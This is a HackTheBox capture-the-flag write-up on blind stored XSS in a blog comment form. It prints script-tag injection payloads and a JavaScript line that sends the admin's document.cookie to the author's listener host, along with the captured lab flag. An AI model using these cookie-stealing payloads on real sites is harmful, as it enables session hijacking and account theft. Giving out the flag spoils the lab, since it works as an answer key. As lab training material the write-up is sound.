# Day27 - XSS Cookie Theft (HTB Skill Assessment)

- **Platform**: HackTheBox  
- **Category**: Web / XSS  
- **Difficulty**: Medium  
- **Date**: 2025-05-27  
- **Tools Used**: BurpSuite, PHP web server  

---

## Summary
The objective was to extract the value of the `flag` cookie from a target web application. By exploiting a blind stored XSS in the comment system, I was able to execute JavaScript in the admin’s browser and exfiltrate cookies to my attacker-controlled server.

---

## Enumeration
- Target: `http://10.129.200.50/assessment`  
- The main page exposed a **search box** and a blog post at:  
  ```
  http://10.129.200.50/assessment/index.php/2021/06/11/welcome-to-security-blog/
  ```
- The post page contained a comment form with the following fields:  
  - Comment  
  - Name  
  - Email  
  - Website  
- Comments required admin approval → suggesting a blind XSS vector.

---

## Exploitation
1. **Set up listener**  
   Hosted a PHP web server to catch callbacks:  
   ```bash
   sudo php -S 0.0.0.0:80
   ```

2. **Test payloads**  
   Injected XSS payloads into each form field:  
   ```html
   "><script src="http://10.129.200.10/comment"></script>
   "><script src="http://10.129.200.10/name"></script>
   "><script src="http://10.129.200.10/email"></script>
   "><script src="http://10.129.200.10/website"></script>
   ```
   - The `email` field rejected invalid input → used `asd@asd.com`.  
   - Logs confirmed a hit on the `website` payload, triggered by the admin user.  

3. **Exfiltrate cookies**  
   - Created a malicious script:  
     ```js
     new Image().src='http://10.129.200.10/index.php?c='+document.cookie;
     ```
   - Hosted as `script.js` and injected via Website field:  
     ```html
     "><script src="http://10.129.200.10/script.js"></script>
     ```

4. **Captured response**  
   Logs showed the admin fetched `script.js` and then requested:  
   ```
   /index.php?c=...; flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
   ```

- **Flag:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`  

---

## Lessons Learned
- Comment systems with admin approval workflows are common blind XSS targets.  
- Hosting payloads externally simplifies logging and cookie exfiltration.  
- Stored XSS can be escalated into **session hijacking** when cookies contain sensitive values like flags or auth tokens.  
